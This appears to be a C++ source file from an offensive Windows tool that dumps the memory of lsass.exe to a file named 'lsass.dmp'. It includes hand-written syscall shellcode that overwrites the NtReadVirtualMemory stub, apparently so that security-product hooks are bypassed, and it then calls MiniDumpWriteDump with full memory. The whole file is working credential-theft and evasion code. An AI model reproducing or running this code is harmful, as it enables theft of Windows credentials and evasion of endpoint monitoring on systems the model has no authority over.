#include "mDumpMtdVirtual.h"

DWORD GetProcId(const wchar_t* ProcName)
{
	PROCESSENTRY32 pe32;
	HANDLE hSnapshot = NULL;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(hSnapshot, &pe32)){
		do {
			if (wcscmp(pe32.szExeFile, ProcName) == 0) {
				return pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}
	if (hSnapshot != INVALID_HANDLE_VALUE)
		CloseHandle(hSnapshot);
	return NULL;
}

void getversion_long()
{
	static auto RtlGetVersion = (RtlGetVersion_t)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlGetVersion");
	auto osvi = OSVERSIONINFOEXW{ sizeof(OSVERSIONINFOEXW) };
	RtlGetVersion((POSVERSIONINFOW)&osvi);
	auto version_long = (osvi.dwMajorVersion << 16) | (osvi.dwMinorVersion << 8) | osvi.wServicePackMajor;
}

BYTE GetNtReadVirtualMemorySyscall()
{

	BYTE syscall_id = 0x3c;
	static auto RtlGetVersion = (RtlGetVersion_t)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlGetVersion");
	auto osvi = OSVERSIONINFOEXW{ sizeof(OSVERSIONINFOEXW) };
	RtlGetVersion((POSVERSIONINFOW)&osvi);
	auto version_long = (osvi.dwMajorVersion << 16) | (osvi.dwMinorVersion << 8) | osvi.wServicePackMajor;
	if (version_long < win8)
	{
		syscall_id = 0x3c;
	}
	else if (version_long == win8)
	{
		syscall_id = 0x3d;
	}
	else if (version_long == win81)
	{
		syscall_id = 0x3e;
	}
	else if (version_long > win81)
	{
		syscall_id = 0x3f;
	}
	return syscall_id;
}

void Free_NtReadVirtualMemory()
{
	BYTE syscall = GetNtReadVirtualMemorySyscall(); //Get the syscall id for NtRVM for your particular os
#ifdef  _WIN64
	BYTE Shellcode[] =
	{
		0x4C, 0x8B, 0xD1,                               // mov r10, rcx; NtReadVirtualMemory
		0xB8, 0x3c, 0x00, 0x00, 0x00,                   // eax, 3ch
		0x0F, 0x05,                                     // syscall
		0xC3                                            // retn
	};

	Shellcode[4] = syscall;
#else
	BYTE Shellcode[] =
	{
		0xB8, 0x3c, 0x00, 0x00, 0x00,                   // mov eax, 3ch; NtReadVirtualMemory
		0x33, 0xC9,                                     // xor ecx, ecx
		0x8D, 0x54, 0x24, 0x04,                         // lea edx, [esp + arg_0]
		0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00,       // call large dword ptr fs : 0C0h
		0x83, 0xC4, 0x04,                               // add esp, 4
		0xC2, 0x14, 0x00                                // retn 14h
	};

	Shellcode[1] = syscall;
#endif //  _WIN64
	WriteProcessMemory(GetCurrentProcess(), NtReadVirtualMemory, Shellcode, sizeof(Shellcode), NULL);
}
bool DumpMtdVirt(const wchar_t* ProcessName)
{
	auto pid = GetProcId(ProcessName);
	auto hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc)
	{
		Free_NtReadVirtualMemory();
		HANDLE hFile = CreateFileA("lsass.dmp", GENERIC_ALL, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (!hFile)
		{
			printf("[-] Cannot continue: Failed to write dump! Aborting...\n");
			exit(1);
		}
		if (hProc)
		{
			BOOL Result = MiniDumpWriteDump(hProc, pid, hFile, MiniDumpWithFullMemory, nullptr, nullptr, nullptr);
			CloseHandle(hFile);
			if (!Result)
			{
				printf("[-] Cannot continue: MiniDumpWrite failed %x\n", GetLastError());
				exit(1);
			}
			else{
				printf("[+] lsass.exe successfully dumped!");
			}
		}
	}
	else
	{
		printf("[-] Cannot continue: Invalid handle to %S\n", ProcessName);
	}
	return 1;
}